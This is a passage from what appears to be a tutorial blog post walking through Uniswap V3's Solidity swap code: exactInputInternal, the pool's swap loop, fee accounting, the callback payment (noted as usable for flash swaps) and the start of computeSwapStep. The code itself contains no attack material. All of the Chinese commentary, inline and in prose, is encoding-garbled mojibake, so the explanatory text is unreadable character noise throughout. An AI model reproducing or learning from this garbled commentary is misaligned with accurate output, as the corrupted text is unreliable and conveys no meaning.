class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function exactInputInternal(<br>    uint256 amountIn,<br>    address recipient,<br>    uint160 sqrtPriceLimitX96,<br>    SwapCallbackData memory data<br>) private returns (uint256 amountOut) &#123;<br>    // allow swapping to the router address with address 0<br>    //å¦‚æœæ”¶æ¬¾åœ°å€ä¸º0ï¼Œåˆ™é»˜è®¤æ”¶æ¬¾åœ°å€ä¸ºæœ¬åˆçº¦åœ°å€<br>    if (recipient == address(0)) recipient = address(this);<br><br>    //å°† path è§£ç ï¼Œè·å–å¤´éƒ¨çš„ tokenIn, tokenOut, fee<br>    (address tokenIn, address tokenOut, uint24 fee) = data.path.decodeFirstPool();<br><br>    //å› ä¸ºäº¤æ˜“æ± åªä¿å­˜äº† token x çš„ä»·æ ¼ï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦çŸ¥é“è¾“å…¥çš„ token æ˜¯äº¤æ˜“æ±  x token è¿˜æ˜¯ y token<br>    //token0/tokenä¸ºtrueï¼Œtoken1/token0ä¸ºfalse<br>    bool zeroForOne = tokenIn &lt; tokenOut;<br><br>    //äº¤æ˜“<br>    (int256 amount0, int256 amount1) =<br>        getPool(tokenIn, tokenOut, fee).swap(<br>            recipient,<br>            zeroForOne,<br>            amountIn.toInt256(),<br>            sqrtPriceLimitX96 == 0<br>                ? (zeroForOne ? TickMath.MIN_SQRT_RATIO + 1 : TickMath.MAX_SQRT_RATIO - 1)<br>                : sqrtPriceLimitX96,<br>            abi.encode(data)<br>        );<br><br>    return uint256(-(zeroForOne ? amount1 : amount0));<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h2><p><img src="/2022/09/29/uniswap-v3-3/image-20220821114016119.png" alt="image-20220821114016119"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function swap(<br>    address recipient, //æ”¶æ¬¾åœ°å€<br>    bool zeroForOne, //ä»£å¸äº¤æ¢æ–¹å‘ï¼Œtoken0/tokenä¸ºtrueï¼Œtoken1/token0ä¸ºfalse<br>    int256 amountSpecified, //äº¤æ¢çš„æ•°é‡ï¼Œæ•°å€¼å¯æ­£å¯è´Ÿ<br>    uint160 sqrtPriceLimitX96, //ä»·æ ¼å¹³æ–¹æ ¹çš„Q64.96ï¼Œå¦‚æœæ˜¯token0/token1æ–¹å‘çš„å…‘æ¢ï¼Œä»·æ ¼ä¸èƒ½ä½äºsqrtPriceLimitX96ï¼Œå¦‚æœæ˜¯token1/token0æ–¹å‘ï¼Œåˆ™ä¸èƒ½å¤§äº<br>    bytes calldata data //å›è°ƒå‡½æ•°çš„å‚æ•°<br>) external override noDelegateCall returns (int256 amount0, int256 amount1) &#123;<br>//æ£€æŸ¥äº¤æ˜“æ•°é‡æ˜¯å¦ä¸º0<br>    require(amountSpecified != 0, &#x27;AS&#x27;);<br><br>    //å°†äº¤æ˜“å‰çš„æ•°æ®ä¿å­˜åœ¨å†…å­˜ä¸­ï¼Œåç»­çš„è®¿é—®é€šè¿‡ `MLOAD` å®Œæˆï¼ŒèŠ‚çœ gas<br>    Slot0 memory slot0Start = slot0;<br><br>    //æ£€æŸ¥æ˜¯å¦æœ‰æ­£åœ¨è¿›è¡Œçš„tokenäº¤æ˜“æ“ä½œ<br>    require(slot0Start.unlocked, &#x27;LOK&#x27;);<br>    //æ ¹æ®äº¤æ˜“æ–¹å‘æ£€æŸ¥ä»·æ ¼æ˜¯å¦æ»¡è¶³æ¡ä»¶<br>    require(<br>        zeroForOne<br>            ? sqrtPriceLimitX96 &lt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &gt; TickMath.MIN_SQRT_RATIO<br>            : sqrtPriceLimitX96 &gt; slot0Start.sqrtPriceX96 &amp;&amp; sqrtPriceLimitX96 &lt; TickMath.MAX_SQRT_RATIO,<br>        &#x27;SPL&#x27;<br>    );<br><br>     //æ›´æ–°slot0.unlockedçš„çŠ¶æ€ï¼Œé˜²æ­¢äº¤æ˜“è¿‡ç¨‹ä¸­å›è°ƒåˆ°åˆçº¦ä¸­å…¶ä»–çš„å‡½æ•°ä¸­ä¿®æ”¹çŠ¶æ€å˜é‡<br>    slot0.unlocked = false;<br><br>    //ç¼“å­˜äº¤æ˜“æ•°æ®<br>    SwapCache memory cache =<br>        SwapCache(&#123;<br>            liquidityStart: liquidity,<br>            blockTimestamp: _blockTimestamp(),<br>            feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol &gt;&gt; 4),<br>            secondsPerLiquidityCumulativeX128: 0,<br>            tickCumulative: 0,<br>            computedLatestObservation: false<br>        &#125;);<br><br>    //æ£€æŸ¥äº¤æ¢çš„æ•°é‡æ˜¯å¦å¤§äº0<br>    bool exactInput = amountSpecified &gt; 0;<br><br>    //å­˜å‚¨äº¤æ˜“çŠ¶æ€ä¿¡æ¯<br>    SwapState memory state =<br>        SwapState(&#123;<br>            amountSpecifiedRemaining: amountSpecified,<br>            amountCalculated: 0,<br>            sqrtPriceX96: slot0Start.sqrtPriceX96,<br>            tick: slot0Start.tick,<br>            feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,<br>            protocolFee: 0,<br>            liquidity: cache.liquidityStart<br>        &#125;);<br><br>    // continue swapping as long as we haven&#x27;t used the entire input/output and haven&#x27;t reached the price limit<br>    //é€šè¿‡ tokenIn æ˜¯å¦è¿˜æœ‰ä½™é¢æ¥åˆ¤æ–­æ˜¯å¦è¿˜éœ€è¦ç»§ç»­å¾ªç¯ï¼Œè¿›å…¥ä¸‹ä¸€æ­¥çš„è¿›è¡Œäº¤æ˜“è®¡ç®—ã€‚å½“ tokenIn å…¨éƒ¨è¢«è€—å°½åï¼Œäº¤æ˜“å°±ç»“æŸäº†ã€‚<br>    while (state.amountSpecifiedRemaining != 0 &amp;&amp; state.sqrtPriceX96 != sqrtPriceLimitX96) &#123;<br>        // äº¤æ˜“è¿‡ç¨‹æ¯ä¸€æ¬¡å¾ªç¯çš„çŠ¶æ€å˜é‡<br>        StepComputations memory step;<br><br>        // äº¤æ˜“çš„èµ·å§‹ä»·æ ¼<br>        step.sqrtPriceStartX96 = state.sqrtPriceX96;<br><br>        // é€šè¿‡ä½å›¾æ‰¾åˆ°ä¸‹ä¸€ä¸ªå¯ä»¥é€‰çš„äº¤æ˜“ä»·æ ¼ï¼Œè¿™é‡Œå¯èƒ½æ˜¯ä¸‹ä¸€ä¸ªæµåŠ¨æ€§çš„è¾¹ç•Œï¼Œä¹Ÿå¯èƒ½è¿˜æ˜¯åœ¨æœ¬æµåŠ¨æ€§ä¸­<br>        (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(<br>            state.tick,<br>            tickSpacing,<br>            zeroForOne<br>        );<br><br>        // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds<br>        if (step.tickNext &lt; TickMath.MIN_TICK) &#123;<br>            step.tickNext = TickMath.MIN_TICK;<br>        &#125; else if (step.tickNext &gt; TickMath.MAX_TICK) &#123;<br>            step.tickNext = TickMath.MAX_TICK;<br>        &#125;<br><br>        // get the price for the next tick<br>        //ä» tick index è®¡ç®— sqrt(price)<br>        step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);<br><br>        // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted<br>        // è®¡ç®—å½“ä»·æ ¼åˆ°è¾¾ä¸‹ä¸€ä¸ªäº¤æ˜“ä»·æ ¼æ—¶ï¼ŒtokenIn æ˜¯å¦è¢«è€—å°½ï¼Œå¦‚æœè¢«è€—å°½ï¼Œåˆ™äº¤æ˜“ç»“æŸï¼Œè¿˜éœ€è¦é‡æ–°è®¡ç®—å‡º tokenIn è€—å°½æ—¶çš„ä»·æ ¼<br>// å¦‚æœæ²¡è¢«è€—å°½ï¼Œé‚£ä¹ˆè¿˜éœ€è¦ç»§ç»­è¿›å…¥ä¸‹ä¸€ä¸ªå¾ªç¯<br>// ä¼šè¿”å›éœ€è¦çš„æ‰‹ç»­è´¹<br>// ä¸‹é¢æœ‰å¯¹æ­¤å‡½æ•°çš„åˆ†æ<br>        (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(<br>            state.sqrtPriceX96,<br>            (zeroForOne ? step.sqrtPriceNextX96 &lt; sqrtPriceLimitX96 : step.sqrtPriceNextX96 &gt; sqrtPriceLimitX96)<br>                ? sqrtPriceLimitX96<br>                : step.sqrtPriceNextX96,<br>            state.liquidity,<br>            state.amountSpecifiedRemaining,<br>            fee<br>        );<br><br>        // æ›´æ–° tokenIn çš„ä½™é¢ï¼Œä»¥åŠ tokenOut æ•°é‡ï¼Œæ³¨æ„å½“æŒ‡å®š tokenIn çš„æ•°é‡è¿›è¡Œäº¤æ˜“æ—¶ï¼Œè¿™é‡Œçš„ tokenOut æ˜¯è´Ÿæ•°.<br>        //å¦‚æœexactInputä¸ºtrueåˆ™è¡¨ç¤ºinputä¸ä¸ºè´Ÿæ•°<br>        if (exactInput) &#123;<br>        //amountSpecifiedRemainingï¼šå‰©ä½™æœŸæœ›å…‘æ¢çš„æ•°é‡<br>        //amountCalculatedï¼šå·²ç»å…‘æ¢çš„æ•°é‡<br>            state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();<br>            state.amountCalculated = state.amountCalculated.sub(step.amountOut.toInt256());<br>        &#125; else &#123;<br>            state.amountSpecifiedRemaining += step.amountOut.toInt256();<br>            state.amountCalculated = state.amountCalculated.add((step.amountIn + step.feeAmount).toInt256());<br>        &#125;<br><br>        // if the protocol fee is on, calculate how much is owed, decrement feeAmount, and increment protocolFee<br>        //æ£€æŸ¥åè®®è´¹ç”¨æ˜¯å¦å¼€å¯<br>        if (cache.feeProtocol &gt; 0) &#123;<br>        //è®¡ç®—æ¬ è´¹å¤šå°‘<br>            uint256 delta = step.feeAmount / cache.feeProtocol;<br>            step.feeAmount -= delta;<br>            state.protocolFee += uint128(delta);<br>        &#125;<br><br>        // update global fee tracker<br>        // æ›´æ–°äº¤æ˜“çš„ f_gï¼Œè¿™é‡Œéœ€è¦é™¤ä»¥æµåŠ¨æ€§ L<br>        // æ›´æ–°æ—¶ä½¿ç”¨æ­¤æ­¥éª¤çš„æ‰‹ç»­è´¹æ€»é¢é™¤ä»¥æ­¤æ­¥éª¤çš„æµåŠ¨æ€§ L ï¼Œä»¥å¾—å‡ºæ¯ä¸€ä»½æµåŠ¨æ€§æ‰€å¯¹åº”çš„æ‰‹ç»­è´¹æ•°å€¼ã€‚<br>        if (state.liquidity &gt; 0)<br>            state.feeGrowthGlobalX128 += FullMath.mulDiv(step.feeAmount, FixedPoint128.Q128, state.liquidity);<br><br>        // shift tick if we reached the next price<br>        // æŒ‰éœ€å†³å®šæ˜¯å¦éœ€è¦æ›´æ–°æµåŠ¨æ€§ L çš„å€¼<br>        // å½“ä»·æ ¼åˆ°è¾¾å½“å‰æ­¥éª¤ä»·æ ¼åŒºé—´çš„è¾¹ç•Œæ—¶ï¼Œå¯èƒ½éœ€è¦ç©¿è¿‡ä¸‹ä¸€ä¸ª tick<br>        if (state.sqrtPriceX96 == step.sqrtPriceNextX96) &#123;<br>            // if the tick is initialized, run the tick transition<br>            //æ£€æŸ¥ tick index æ˜¯å¦ä¸ºå¦ä¸€ä¸ªæµåŠ¨æ€§çš„è¾¹ç•Œ<br>            if (step.initialized) &#123;<br>                // check for the placeholder value, which we replace with the actual value the first time the swap<br>                // crosses an initialized tick<br>                if (!cache.computedLatestObservation) &#123;<br>                    (cache.tickCumulative, cache.secondsPerLiquidityCumulativeX128) = observations.observeSingle(<br>                        cache.blockTimestamp,<br>                        0,<br>                        slot0Start.tick,<br>                        slot0Start.observationIndex,<br>                        cache.liquidityStart,<br>                        slot0Start.observationCardinality<br>                    );<br>                    cache.computedLatestObservation = true;<br>                &#125;<br>                int128 liquidityNet =<br>                    // åœ¨è¿™é‡Œéœ€è¦æ›´æ–° tick çš„ f_o<br>                    ticks.cross(<br>                        step.tickNext,<br>                        (zeroForOne ? state.feeGrowthGlobalX128 : feeGrowthGlobal0X128),<br>                        (zeroForOne ? feeGrowthGlobal1X128 : state.feeGrowthGlobalX128),<br>                        cache.secondsPerLiquidityCumulativeX128,<br>                        cache.tickCumulative,<br>                        cache.blockTimestamp<br>                    );<br>                // if we&#x27;re moving leftward, we interpret liquidityNet as the opposite sign<br>                // safe because liquidityNet cannot be type(int128).min<br>                // æ ¹æ®ä»·æ ¼å¢åŠ /å‡å°‘ï¼Œå³å‘å·¦æˆ–å‘å³ç§»åŠ¨ï¼Œå¢åŠ /å‡å°‘ç›¸åº”çš„æµåŠ¨æ€§<br>                if (zeroForOne) liquidityNet = -liquidityNet;<br><br>                //æ›´æ–°æµåŠ¨æ€§<br>                state.liquidity = LiquidityMath.addDelta(state.liquidity, liquidityNet);<br>            &#125;<br><br>            //åœ¨è¿™é‡Œæ›´ tick çš„å€¼ï¼Œä½¿å¾—ä¸‹ä¸€æ¬¡å¾ªç¯æ—¶è®© tickBitmap è¿›å…¥ä¸‹ä¸€ä¸ª word ä¸­æŸ¥è¯¢<br>            state.tick = zeroForOne ? step.tickNext - 1 : step.tickNext;<br>        &#125; else if (state.sqrtPriceX96 != step.sqrtPriceStartX96) &#123;<br>            // recompute unless we&#x27;re on a lower tick boundary (i.e. already transitioned ticks), and haven&#x27;t moved<br>            //å¦‚æœ tokenIn è¢«è€—å°½ï¼Œé‚£ä¹ˆè®¡ç®—å½“å‰ä»·æ ¼å¯¹åº”çš„ tick<br>            state.tick = TickMath.getTickAtSqrtRatio(state.sqrtPriceX96);<br>        &#125;<br>    &#125;<br><br>    // update tick and write an oracle entry if the tick change<br>    //å½“trickæ”¹å˜æ—¶å†™å…¥ä¸€ä¸ªoracleæ¡ç›®<br>    if (state.tick != slot0Start.tick) &#123;<br>        (uint16 observationIndex, uint16 observationCardinality) =<br>            observations.write(<br>                slot0Start.observationIndex,<br>                cache.blockTimestamp,<br>                slot0Start.tick,<br>                cache.liquidityStart,<br>                slot0Start.observationCardinality,<br>                slot0Start.observationCardinalityNext<br>            );<br>        (slot0.sqrtPriceX96, slot0.tick, slot0.observationIndex, slot0.observationCardinality) = (<br>            state.sqrtPriceX96,<br>            state.tick,<br>            observationIndex,<br>            observationCardinality<br>        );<br>    &#125; else &#123;<br>        // otherwise just update the price<br>        //å¦åˆ™åªæ›´æ–°ä»·æ ¼<br>        slot0.sqrtPriceX96 = state.sqrtPriceX96;<br>    &#125;<br><br>    // update liquidity if it changed<br>    //å¦‚æœæµåŠ¨æ€§å‘ç”Ÿå˜åŒ–åˆ™æ›´æ–°æµåŠ¨æ€§<br>    if (cache.liquidityStart != state.liquidity) liquidity = state.liquidity;<br><br>    // update fee growth global and, if necessary, protocol fees<br>    // overflow is acceptable, protocol has to withdraw before it hits type(uint128).max fees<br>    // æ›´æ–°è´¹ç”¨<br>    // åœ¨äº¤æ˜“æ­¥éª¤å®Œæˆåï¼Œæ›´æ–°åˆçº¦çš„ f_g<br>    if (zeroForOne) &#123;<br>        feeGrowthGlobal0X128 = state.feeGrowthGlobalX128;<br>        if (state.protocolFee &gt; 0) protocolFees.token0 += state.protocolFee;<br>    &#125; else &#123;<br>        feeGrowthGlobal1X128 = state.feeGrowthGlobalX128;<br>        if (state.protocolFee &gt; 0) protocolFees.token1 += state.protocolFee;<br>    &#125;<br><br>    //ç¡®å®šæœ€ç»ˆç”¨æˆ·æ”¯ä»˜çš„ token æ•°å’Œå¾—åˆ°çš„ token æ•°<br>    (amount0, amount1) = zeroForOne == exactInput<br>        ? (amountSpecified - state.amountSpecifiedRemaining, state.amountCalculated)<br>        : (state.amountCalculated, amountSpecified - state.amountSpecifiedRemaining);<br><br>    // do the transfers and collect payment<br>    //è½¬è´¦å’Œè´¹ç”¨æ”¶å–<br>    if (zeroForOne) &#123;<br>        // å°† tokenOut æ”¯ä»˜ç»™ç”¨æˆ·ï¼Œå‰é¢è¯´è¿‡ tokenOut è®°å½•çš„æ˜¯è´Ÿæ•°<br>        if (amount1 &lt; 0) TransferHelper.safeTransfer(token1, recipient, uint256(-amount1));<br><br>        uint256 balance0Before = balance0();<br>        // è¿˜æ˜¯é€šè¿‡å›è°ƒçš„æ–¹å¼ï¼Œæ‰£é™¤ç”¨æˆ·éœ€è¦æ”¯æŒçš„ token<br>        //è¿™é‡Œè¿˜æ˜¯é€šè¿‡å›è°ƒå®Œæˆç”¨æˆ·æ”¯ä»˜ token çš„è´¹ç”¨ã€‚å› ä¸ºå‘é€ç”¨æˆ· token æ˜¯åœ¨å›è°ƒå‡½æ•°ä¹‹å‰å®Œæˆçš„ï¼Œå› æ­¤è¿™ä¸ª swap å‡½æ•°æ˜¯å¯ä»¥è¢«å½“ä½œ flash swap æ¥ä½¿ç”¨çš„ã€‚<br>        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);<br>        // æ ¡éªŒæ‰£é™¤æ˜¯å¦æˆåŠŸ<br>        require(balance0Before.add(uint256(amount0)) &lt;= balance0(), &#x27;IIA&#x27;);<br>    &#125; else &#123;<br>        if (amount0 &lt; 0) TransferHelper.safeTransfer(token0, recipient, uint256(-amount0));<br><br>        uint256 balance1Before = balance1();<br>        IUniswapV3SwapCallback(msg.sender).uniswapV3SwapCallback(amount0, amount1, data);<br>        require(balance1Before.add(uint256(amount1)) &lt;= balance1(), &#x27;IIA&#x27;);<br>    &#125;<br><br>    //è®°å½•æ—¥å¿—<br>    emit Swap(msg.sender, recipient, amount0, amount1, state.sqrtPriceX96, state.liquidity, state.tick);<br>    //è§£é™¤é˜²æ­¢é‡å…¥çš„é”<br>    slot0.unlocked = true;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>ç”±äºè¿™é‡Œè¿˜æ˜¯é€šè¿‡å›è°ƒå®Œæˆç”¨æˆ·æ”¯ä»˜ token çš„è´¹ç”¨ã€‚å› ä¸ºå‘é€ç”¨æˆ· token æ˜¯åœ¨å›è°ƒå‡½æ•°ä¹‹å‰å®Œæˆçš„ï¼Œå› æ­¤è¿™ä¸ª <code>swap</code> å‡½æ•°æ˜¯å¯ä»¥è¢«å½“ä½œ <code>flash swap</code> æ¥ä½¿ç”¨çš„ã€‚</p><p>éœ€è¦æ³¨æ„ï¼Œå¦‚æœæœ¬æ¬¡äº¤æ˜“æ˜¯äº¤æ˜“è·¯å¾„ä¸­çš„ä¸€æ¬¡ä¸­é—´äº¤æ˜“ï¼Œé‚£ä¹ˆæ‰£é™¤çš„ token æ˜¯ä» <code>SwapRouter</code> ä¸­æ‰£é™¤çš„ï¼Œäº¤æ˜“å®Œæˆè·å¾—çš„ token ä¹Ÿä¼šå‘é€ç»™ <code>SwapRouter</code> ä»¥ä¾¿å…¶è¿›è¡Œä¸‹ä¸€æ­¥çš„äº¤æ˜“</p><h3 id="computeSwapStep"><a href="#computeSwapStep" class="headerlink" title="computeSwapStep"></a>computeSwapStep</h3><p>äº¤æ˜“æ˜¯å¦èƒ½å¤Ÿç»“æŸçš„å…³é”®è®¡ç®—åœ¨ <code>SwapMath.computeSwapStep</code> ä¸­å®Œæˆï¼Œè¿™é‡Œè®¡ç®—äº†äº¤æ˜“æ˜¯å¦èƒ½åœ¨ç›®æ ‡ä»·æ ¼èŒƒå›´å†…ç»“æŸï¼Œä»¥åŠæ¶ˆè€—çš„ <code>tokenIn</code> å’Œå¾—åˆ°çš„ <code>tokenOut</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs solidity">function computeSwapStep(<br>        uint160 sqrtRatioCurrentX96,<br>        uint160 sqrtRatioTargetX96,<br>        uint128 liquidity,<br>        int256 amountRemaining,<br>        uint24 feePips<br>    )<br>        internal<br>        pure<br>        returns (<br>            uint160 sqrtRatioNextX96,<br>            uint256 amountIn,<br>            uint256 amountOut,<br>            uint256 feeAmount<br>        )<br>    &#123;<br>        // åˆ¤æ–­äº¤æ˜“çš„æ–¹å‘ï¼Œå³ä»·æ ¼é™ä½æˆ–å‡é«˜<br>        bool zeroForOne = sqrtRatioCurrentX96 &gt;= sqrtRatioTargetX96;<br>        // åˆ¤æ–­æ˜¯å¦æŒ‡å®šäº†ç²¾ç¡®çš„ tokenIn æ•°é‡<br>        bool exactIn = amountRemaining &gt;= 0;<br><br>        if (exactIn) &#123;<br>        // å…ˆå°† tokenIn çš„ä½™é¢æ‰£é™¤æ‰æœ€å¤§æ‰€éœ€çš„æ‰‹ç»­è´¹<br>            uint256 amountRemainingLessFee = FullMath.mulDiv(uint256(amountRemaining), 1e6 - feePips, 1e6);<br>            // é€šè¿‡å…¬å¼è®¡ç®—å‡ºåˆ°è¾¾ç›®æ ‡ä»·æ‰€éœ€è¦çš„ tokenIn æ•°é‡ï¼Œè¿™é‡Œå¯¹ x token å’Œ y token è®¡ç®—çš„å…¬å¼æ˜¯ä¸ä¸€æ ·çš„<br>            amountIn = zeroForOne<br>                //getAmount0Deltaå’ŒgetAmount1Deltaçš„å…·ä½“å®ç°åœ¨ä¸Šä¸€ç« æœ‰è¯¦ç»†è§£é‡Š<br>                ? SqrtPriceMath.getAmount0Delta(sqrtRatioTargetX96, sqrtRatioCurrentX96, liquidity, true)<br>                : SqrtPriceMath.getAmount1Delta(sqrtRatioCurrentX96, sqrtRatioTargetX96, liquidity, true);<br>            // åˆ¤æ–­ä½™é¢æ˜¯å¦å……è¶³ï¼Œå¦‚æœå……è¶³ï¼Œé‚£ä¹ˆè¿™æ¬¡äº¤æ˜“å¯ä»¥åˆ°è¾¾ç›®æ ‡äº¤æ˜“ä»·æ ¼ï¼Œå¦åˆ™éœ€è¦è®¡ç®—å‡ºå½“å‰ tokenIn èƒ½åˆ°è¾¾çš„ç›®æ ‡äº¤æ˜“ä»·<br>            if (amountRemainingLessFee &gt;= amountIn) sqrtRatioNextX96 = sqrtRatioTargetX96;<br>            else<br>                sqrtRatioNextX96 = SqrtPriceMath.getNextSqrtPriceFromInput(<br>                    sqrtRatioCurrentX96,<br>                    liquidity,<br>                    amountRemainingLessFee,<br>                    